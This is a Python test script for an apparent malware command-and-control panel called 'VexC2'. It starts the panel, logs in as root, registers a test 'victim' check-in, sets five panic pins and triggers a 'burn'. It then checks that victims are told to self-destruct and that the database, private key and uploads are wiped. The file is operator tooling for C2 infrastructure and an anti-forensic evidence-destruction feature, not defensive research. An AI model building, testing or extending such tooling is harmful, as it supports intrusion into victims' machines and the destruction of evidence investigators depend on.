"""Live definitive-panic test: burn a throwaway panel and verify nothing left.

Runs VexC2/run_prod.py against a temp DB/uploads/priv/build-cache, sets five
pins, burns, checks the kill channel, waits for exit, and asserts every local
artifact is gone. Build outputs in the repo are excluded via VEX_PANIC_BUILDS=0.
"""

import http.cookiejar
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import urllib.parse
import urllib.request

ROOT = r"D:\Vexpayload"
BASE = tempfile.mkdtemp(prefix="vex_panic_")
DB = os.path.join(BASE, "vex_c2.db")
UPLOADS = os.path.join(BASE, "uploads")
CACHE = os.path.join(BASE, "build_cache")
PRIV = os.path.join(BASE, "priv.pem")
PY = sys.executable
CHECKS = []


def ok(name, cond, extra=""):
    CHECKS.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name + ((" " + str(extra)) if extra else ""))


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def wait_port(port, timeout=30):
    end = time.time() + timeout
    while time.time() < end:
        try:
            with socket.create_connection(("127.0.0.1", port), 0.5):
                return True
        except OSError:
            time.sleep(0.2)
    return False


def main() -> int:
    os.makedirs(UPLOADS, exist_ok=True)
    shutil.copy(os.path.join(ROOT, "VexC2", "priv.pem"), PRIV)

    port = free_port()
    env = dict(os.environ)
    env.update({
        "VEX_DB": DB,
        "VEX_UPLOADS": UPLOADS,
        "VEX_BUILD_CACHE": CACHE,
        "VEX_PRIV": PRIV,
        "VEX_PASS": "live-admin-pass",
        "VEX_ROOT_PASS": "live-root-pass-123",
        "VEX_MASTER": "live-master",
        "VEX_SECRET": "q" * 64,
        "VEX_NO_HOUSEKEEPING": "1",
        "VEX_ALLOW_PASSWORD_STEPUP": "1",
        "VEX_PANIC_BUILDS": "0",
        "VEX_PANIC_EXIT_SECONDS": "3",
        "VEX_PANIC_DRY": "0",
        "PORT": str(port),
        "VEX_HOST": "127.0.0.1",
    })
    proc = subprocess.Popen([PY, "-u", os.path.join(ROOT, "VexC2", "run_prod.py")],
                            cwd=os.path.join(ROOT, "VexC2"), env=env,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    base = f"http://127.0.0.1:{port}"

    def get(path):
        return opener.open(base + path, timeout=20)

    def post(path, data):
        body = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(base + path, data=body, method="POST")
        return opener.open(req, timeout=30)

    def csrf(path):
        html = get(path).read().decode("utf-8", "replace")
        m = re.search(r'name="csrf" value="([0-9a-f]+)"', html)
        return m.group(1) if m else ""

    try:
        ok("panel up", wait_port(port))
        t = csrf("/admin/login")
        post("/admin/login", {"csrf": t, "username": "root",
                              "password": "live-root-pass-123"})
        t = csrf("/admin/root/stepup")
        post("/admin/root/stepup", {"csrf": t, "password": "live-root-pass-123",
                                    "next": "/admin/root"})
        pins = ["1111", "2222", "3333", "4444", "5555"]
        pin_data = {"pin%d" % (i + 1): p for i, p in enumerate(pins)}

        # a victim row so the burn has something to kill and wipe
        t = csrf("/admin")
        post("/api/checkin", {"vid": "panictestvid0001", "key": "AAAA"})
        t = csrf("/admin/root")
        r = post("/admin/root/panic-pins", {"csrf": t, **pin_data})
        ok("pins saved", r.status == 200)

        t = csrf("/admin/root")
        r = post("/admin/root/burn", {"csrf": t, **pin_data})
        body = r.read().decode("utf-8", "replace")
        ok("burn page", r.status == 200 and "OPERATION BURNED" in body)
        ok("burn reports kills", "victims queued for self-destruct" in body)

        r = get("/api/ping?vid=panictestvid0001")
        ok("post-burn ping kills", r.read().decode().strip() == "kill")

        end = time.time() + 20
        while time.time() < end and proc.poll() is None:
            time.sleep(0.3)
        ok("panel exits", proc.poll() is not None)

        ok("database gone", not os.path.exists(DB))
        ok("db wal gone", not os.path.exists(DB + "-wal"))
        ok("priv key gone", not os.path.exists(PRIV))
        ok("uploads gone", not os.path.exists(UPLOADS))
        return 0
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()


if __name__ == "__main__":
    try:
        rc = main()
    finally:
        bad = [n for n, s in CHECKS if not s]
        print(f"\n{len(CHECKS) - len(bad)}/{len(CHECKS)} checks passed")
        shutil.rmtree(BASE, ignore_errors=True)
    sys.exit(1 if bad else 0)
